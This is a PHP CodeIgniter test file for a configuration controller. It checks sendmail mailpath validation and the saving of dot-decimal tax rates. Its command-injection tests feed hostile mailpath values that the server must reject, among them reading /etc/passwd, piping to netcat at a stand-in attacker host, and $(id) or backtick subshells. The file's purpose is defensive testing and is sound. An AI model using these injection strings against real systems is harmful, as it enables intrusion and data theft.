<?php

namespace Tests\Controllers;

use CodeIgniter\Test\CIUnitTestCase;
use CodeIgniter\Test\DatabaseTestTrait;
use CodeIgniter\Test\FeatureTestTrait;
use CodeIgniter\Config\Services;
use App\Models\Appconfig;

class ConfigTest extends CIUnitTestCase
{
    use DatabaseTestTrait;
    use FeatureTestTrait;

    protected $migrate     = true;
    protected $migrateOnce = true;
    protected $refresh     = false;
    protected $namespace   = null;

    protected function setUp(): void
    {
        parent::setUp();
    }

    protected function resetSession(): void
    {
        $session = Services::session();
        $session->destroy();
        $session->set('person_id', 1);
        $session->set('menu_group', 'office');
    }

    // ========== Valid Mailpath Tests ==========

    public function testValidMailpath_AcceptsStandardPath(): void
    {
        $this->resetSession();

        $response = $this->post('/config/saveEmail', [
            'protocol' => 'sendmail',
            'mailpath' => '/usr/sbin/sendmail'
        ]);

        $response->assertStatus(200);
        $result = json_decode($response->getJSON(), true);
        $this->assertTrue($result['success']);
    }

    public function testValidMailpath_AcceptsPathWithDots(): void
    {
        $this->resetSession();

        $response = $this->post('/config/saveEmail', [
            'protocol' => 'sendmail',
            'mailpath' => '/usr/local/bin/sendmail.local'
        ]);

        $response->assertStatus(200);
        $result = json_decode($response->getJSON(), true);
        $this->assertTrue($result['success']);
    }

    public function testValidMailpath_AcceptsEmptyStringForNonSendmailProtocol(): void
    {
        $this->resetSession();

        $response = $this->post('/config/saveEmail', [
            'protocol' => 'mail',
            'mailpath' => ''
        ]);

        $response->assertStatus(200);
        $result = json_decode($response->getJSON(), true);
        $this->assertTrue($result['success']);
    }

    public function testSendmailProtocol_RequiresMailpath(): void
    {
        $this->resetSession();

        $response = $this->post('/config/saveEmail', [
            'protocol' => 'sendmail',
            'mailpath' => ''
        ]);

        $response->assertStatus(200);
        $result = json_decode($response->getJSON(), true);
        $this->assertFalse($result['success']);
        $this->assertStringContainsString('invalid', strtolower($result['message']));
    }

    public function testNonSendmailProtocol_RejectsMaliciousMailpath(): void
    {
        $this->resetSession();

        $response = $this->post('/config/saveEmail', [
            'protocol' => 'smtp',
            'mailpath' => '/usr/sbin/sendmail; cat /etc/passwd'
        ]);

        $response->assertStatus(200);
        $result = json_decode($response->getJSON(), true);
        $this->assertFalse($result['success']);
        $this->assertStringContainsString('invalid', strtolower($result['message']));
    }

    // ========== Command Injection Prevention Tests ==========

    public function testMailpath_RejectsCommandInjection_Semicolon(): void
    {
        $this->resetSession();

        $response = $this->post('/config/saveEmail', [
            'protocol' => 'sendmail',
            'mailpath' => '/usr/sbin/sendmail; cat /etc/passwd'
        ]);

        $response->assertStatus(200);
        $result = json_decode($response->getJSON(), true);
        $this->assertFalse($result['success']);
        $this->assertStringContainsString('invalid', strtolower($result['message']));
    }

    public function testMailpath_RejectsCommandInjection_Pipe(): void
    {
        $this->resetSession();

        $response = $this->post('/config/saveEmail', [
            'protocol' => 'sendmail',
            'mailpath' => '/usr/sbin/sendmail | nc attacker.com 4444'
        ]);

        $response->assertStatus(200);
        $result = json_decode($response->getJSON(), true);
        $this->assertFalse($result['success']);
    }

    public function testMailpath_RejectsCommandInjection_And(): void
    {
        $this->resetSession();

        $response = $this->post('/config/saveEmail', [
            'protocol' => 'sendmail',
            'mailpath' => '/usr/sbin/sendmail && whoami'
        ]);

        $response->assertStatus(200);
        $result = json_decode($response->getJSON(), true);
        $this->assertFalse($result['success']);
    }

    public function testMailpath_RejectsCommandInjection_Backtick(): void
    {
        $this->resetSession();

        $response = $this->post('/config/saveEmail', [
            'protocol' => 'sendmail',
            'mailpath' => '/usr/sbin/`whoami`'
        ]);

        $response->assertStatus(200);
        $result = json_decode($response->getJSON(), true);
        $this->assertFalse($result['success']);
    }

    public function testMailpath_RejectsCommandInjection_Subshell(): void
    {
        $this->resetSession();

        $response = $this->post('/config/saveEmail', [
            'protocol' => 'sendmail',
            'mailpath' => '/usr/sbin/sendmail$(id)'
        ]);

        $response->assertStatus(200);
        $result = json_decode($response->getJSON(), true);
        $this->assertFalse($result['success']);
    }

    public function testMailpath_RejectsCommandInjection_SpaceInPath(): void
    {
        $this->resetSession();

        $response = $this->post('/config/saveEmail', [
            'protocol' => 'sendmail',
            'mailpath' => '/usr/sbin/sendmail -t -i'
        ]);

        $response->assertStatus(200);
        $result = json_decode($response->getJSON(), true);
        $this->assertFalse($result['success']);
    }

    public function testMailpath_RejectsCommandInjection_Newline(): void
    {
        $this->resetSession();

        $response = $this->post('/config/saveEmail', [
            'protocol' => 'sendmail',
            'mailpath' => "/usr/sbin/sendmail\n/bin/bash"
        ]);

        $response->assertStatus(200);
        $result = json_decode($response->getJSON(), true);
        $this->assertFalse($result['success']);
    }

    public function testMailpath_RejectsCommandInjection_DollarSign(): void
    {
        $this->resetSession();

        $response = $this->post('/config/saveEmail', [
            'protocol' => 'sendmail',
            'mailpath' => '/usr/sbin/$SENDMAIL'
        ]);

        $response->assertStatus(200);
        $result = json_decode($response->getJSON(), true);
        $this->assertFalse($result['success']);
    }

    // ========== Tax Rate Locale Tests ==========
    // These tests verify that tax rate inputs (type="number") work correctly
    // regardless of locale settings. Browsers always submit type="number" inputs
    // as dot-decimal values, so the server must handle them correctly without
    // using locale-aware parse_tax() which would misinterpret the dot.

    public function testTaxRate_SavesDotDecimalValueCorrectly(): void
    {
        $this->resetSession();

        // type="number" inputs always submit dot-decimal "5.5", not comma-decimal "5,5"
        $response = $this->post('/config/saveTax', [
            'default_tax_1_rate' => '5.5',
            'default_tax_1_name' => 'Tax 1',
            'tax_included' => '0',
        ]);

        $response->assertStatus(200);
        $result = json_decode($response->getJSON(), true);
        $this->assertTrue($result['success']);

        // Verify the value was saved correctly as 5.5, not truncated to 5
        $config = model(Appconfig::class);
        $savedRate = $config->get_value('default_tax_1_rate');
        $this->assertEquals(5.5, (float) $savedRate, 'Tax rate should be saved as 5.5, not truncated to 5');
    }

    public function testTaxRate_SavesIntegerValueCorrectly(): void
    {
        $this->resetSession();

        $response = $this->post('/config/saveTax', [
            'default_tax_1_rate' => '18',
            'default_tax_1_name' => 'VAT',
            'tax_included' => '0',
        ]);

        $response->assertStatus(200);
        $result = json_decode($response->getJSON(), true);
        $this->assertTrue($result['success']);

        $config = model(Appconfig::class);
        $savedRate = $config->get_value('default_tax_1_rate');
        $this->assertEquals(18.0, (float) $savedRate, 'Tax rate should be saved as 18');
    }

    public function testTaxRate_SavesHighPrecisionDecimal(): void
    {
        $this->resetSession();

        $response = $this->post('/config/saveTax', [
            'default_tax_1_rate' => '8.25',
            'default_tax_1_name' => 'Sales Tax',
            'tax_included' => '0',
        ]);

        $response->assertStatus(200);
        $result = json_decode($response->getJSON(), true);
        $this->assertTrue($result['success']);

        $config = model(Appconfig::class);
        $savedRate = $config->get_value('default_tax_1_rate');
        $this->assertEquals(8.25, (float) $savedRate, 'Tax rate should preserve decimal precision');
    }

    public function testTaxRate_BothTaxRatesSavedCorrectly(): void
    {
        $this->resetSession();

        $response = $this->post('/config/saveTax', [
            'default_tax_1_rate' => '10.5',
            'default_tax_1_name' => 'State Tax',
            'default_tax_2_rate' => '5.25',
            'default_tax_2_name' => 'Local Tax',
            'tax_included' => '0',
        ]);

        $response->assertStatus(200);
        $result = json_decode($response->getJSON(), true);
        $this->assertTrue($result['success']);

        $config = model(Appconfig::class);
        $savedRate1 = $config->get_value('default_tax_1_rate');
        $savedRate2 = $config->get_value('default_tax_2_rate');
        
        $this->assertEquals(10.5, (float) $savedRate1, 'Tax 1 rate should be 10.5');
        $this->assertEquals(5.25, (float) $savedRate2, 'Tax 2 rate should be 5.25');
    }

    public function testTaxRate_HandlesEmptyString(): void
    {
        $this->resetSession();

        $response = $this->post('/config/saveTax', [
            'default_tax_1_rate' => '',
            'default_tax_1_name' => 'Tax 1',
            'tax_included' => '0',
        ]);

        $response->assertStatus(200);
        $result = json_decode($response->getJSON(), true);
        $this->assertTrue($result['success']);
    }
}